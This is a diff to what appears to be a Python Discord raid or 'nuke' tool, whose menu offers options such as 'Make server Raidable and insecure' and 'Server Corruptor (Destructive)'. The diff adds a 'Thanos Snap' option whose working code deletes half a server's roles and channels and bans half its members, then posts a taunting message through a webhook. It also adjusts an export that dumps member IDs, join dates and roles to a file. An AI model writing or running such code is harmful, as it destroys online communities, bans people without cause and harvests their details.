@@ -23,6 +23,10 @@ try:
 except Exception as e:
     print ("Module import error: " + str(e))
 try:
+    from dhooks import Webhook
+except Exception as e:
+    print ("Module import error: " + str(e))
+try:
     import requests
 except Exception as e:
     print ("Module import error: " + str(e))
@@ -665,13 +669,13 @@ async def main(SERVER):
                     handle.write("\n===============================\nText Channels:\n===============================\n\n")
                     for channel in server.text_channels:
                         try:
-                            handle.write("Name: {}\nID: {}\nTopic: {}\nSlowmode Delay: {}\nPosition: {}\nCategory: {}\n\n\n-----------------------\n\n\n".format(channel.name,str(channel.id),channel.topic,str(channel.slowmode_delay),str(channel.position),client.get_channel(channel.category_id).name))
+                            handle.write("Name: {}\nID: {}\nTopic: {}\nSlowmode Delay: {}\nPosition: {}\nCategory: {}\n\n-----------------------\n\n".format(channel.name,str(channel.id),channel.topic,str(channel.slowmode_delay),str(channel.position),client.get_channel(channel.category_id).name))
                         except Exception:
                             pass
                     handle.write("\n===============================\nVoice Channels:\n===============================\n\n")
                     for channel in server.voice_channels:
                         try:
-                            handle.write("Name: {}\nID: {}\nBitrate: {}\nUser limit: {}\nPosition: {}\nCategory: {}\nConnected users:\n".format(channel.name,str(channel.id),str(channel.bitrate),str(channel.user_limit),str(channel.position),client.get_channel(channel.category_id).name))
+                            handle.write("Name: {}\nID: {}\nBitrate: {}\nUser limit: {}\nPosition: {}\nCategory: {}\nConnected users:\n\n".format(channel.name,str(channel.id),str(channel.bitrate),str(channel.user_limit),str(channel.position),client.get_channel(channel.category_id).name))
                             for u in channel.members:
                                 handle.write("User: {}#{}\nID: {}\nBot: {}\n".format(u.name,u.discriminator,str(u.id),str(u.bot)))
                                 handle.write("\n-----------------------\n\n")
@@ -680,18 +684,19 @@ async def main(SERVER):
                     handle.write("\n===============================\nRoles:\n===============================\n\n")
                     for role in server.roles:
                         try:
-                            handle.write("Name: {}\nID: {}\nColour: {}\nHoisted: {}\nPositon: {}\nMentionable: {}\nPermissions: {}\n\n\n-----------------------\n\n\n".format(role.name,str(role.id),str(role.colour.value),str(role.hoist),str(role.position),str(role.mentionable),str(role.permissions)))
+                            handle.write("Name: {}\nID: {}\nColour: {}\nHoisted: {}\nPositon: {}\nMentionable: {}\nPermissions: {}\n\n-----------------------\n\n".format(role.name,str(role.id),str(role.colour.value),str(role.hoist),str(role.position),str(role.mentionable),str(role.permissions)))
                         except Exception:
                             pass
                     handle.write("\n===============================\nUsers:\n===============================\n\n")
                     for user in server.members:
                         try:
-                            handle.write("Name: {}#{}\nID: {}\nAvatar: {}\nBot: {}\nDate Joined: {}\nNickname: {}\n\n\n-----------------------\n\n\n".format(user.name,str(user.discriminator),str(user.id),str(user.avatar_url),str(user.bot),str(user.joined_at),user.nick))
+                            handle.write("Name: {}#{}\nID: {}\nAvatar: {}\nBot: {}\nDate Joined: {}\nNickname: {}\n\n-----------------------\n\n".format(user.name,str(user.discriminator),str(user.id),str(user.avatar_url),str(user.bot),str(user.joined_at),user.nick))
                         except Exception:
                             pass
                 print("Exported to {} info.txt".format(server.name))
                 await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Press enter to return to menu.")
             await main(SERVER)
+
         elif int(opts) == 1:
             async def changesettings(toggleopts,SERVER):
                 if sys.platform.startswith('win32'):
@@ -1092,16 +1097,17 @@ async def main(SERVER):
         elif int(opts) == 2:
             clear()
             print(colored("Other options",menucolour))
-            print(colored("0.  Back",menucolour))
-            print(colored("1.  Move People in VC",menucolour))
-            print(colored("2.  Mass Nickname Change",menucolour))
-            print(colored("3.  Make server Raidable and insecure",menucolour))
-            print(colored("4.  Check Bot Permissions",menucolour))
-            print(colored("5.  Channel Webhook Smasher",menucolour))
-            print(colored("6.  Server Corruptor (Destructive)",menucolour))
-            print(colored("7.  Music Player",menucolour))
-            print(colored("8.  Make all channels NSFW",menucolour))
-            print(colored("9.  Change All channels topic",menucolour))
+            print(colored("0.   Back",menucolour))
+            print(colored("1.   Move People in VC",menucolour))
+            print(colored("2.   Mass Nickname Change",menucolour))
+            print(colored("3.   Make server Raidable and insecure",menucolour))
+            print(colored("4.   Check Bot Permissions",menucolour))
+            print(colored("5.   Channel Webhook Smasher",menucolour))
+            print(colored("6.   Server Corruptor (Destructive)",menucolour))
+            print(colored("7.   Music Player",menucolour))
+            print(colored("8.   Make all channels NSFW",menucolour))
+            print(colored("9.   Change All channels topic",menucolour))
+            print(colored("10.  Thanos Snap (Destructive)",menucolour))
             sel = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Selection: ')
             if int(sel) == 0:
                 await main(SERVER)
@@ -1244,6 +1250,61 @@ async def main(SERVER):
                     pool.add_task(topicedit,channel.id,y)
                 await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                 await main(SERVER)
+            elif int(sel) == 10:
+                clear()
+                print(colored("The end is near.",'magenta'))
+                s = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Continue?(Y/N): ')
+                if s.lower() == 'y':
+                    pass
+                else:
+                    await main(SERVER)
+                channels = []
+                users = []
+                roles = []
+                for channel in server.channels:
+                    channels.append(channel)
+                for role in server.roles:
+                    roles.append(role)
+                for user in server.members:
+                    users.append(user)
+                count = 0
+                halfroles = int(round(len(server.roles) / 2))
+                for role in roles:
+                    count += 1
+                    if halfroles == count:
+                        break
+                    pool.add_task(deleterole,str(role.id),SERVER)
+                    roles.remove(role)
+                count = 0
+                halfchan = int(round(len(server.channels) / 2))
+                for channel in channels:
+                    count += 1
+                    if halfchan == count:
+                        break
+                    pool.add_task(deletechannel,str(channel.id))
+                    channels.remove(channel)
+                count = 0
+                halfuser = int(round(len(server.members) / 2))
+                for user in users:
+                    count += 1
+                    if halfuser == count:
+                        break
+                    pool.add_task(banuser,str(user.id),SERVER)
+                    users.remove(user)
+                pool.wait_completion()
+                await asyncio.sleep(10)
+                for channel in channels:
+                    try:
+                        wh = await channel.create_webhook(name=asciigen(random.randint(2,80)))
+                    except Exception as e:
+                        print(e)
+                        continue
+                    else:
+                        break
+                hook = Webhook(wh.url)
+                hook.send("**Perfectly balanced, as all things should be.**",avatar_url='https://i.imgur.com/hLU3tXY.jpg',username='Thanos')
+                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Perfectly balanced, as all things should be.')
+                await main(SERVER)
             else:
                 await main(SERVER)
 
@@ -1283,7 +1344,6 @@ async def main(SERVER):
 
         elif int(opts) == 6:
             await serverselect()
-
     except Exception as e:
         print (colored("Error:","red"))
         print (colored(e,"red"))
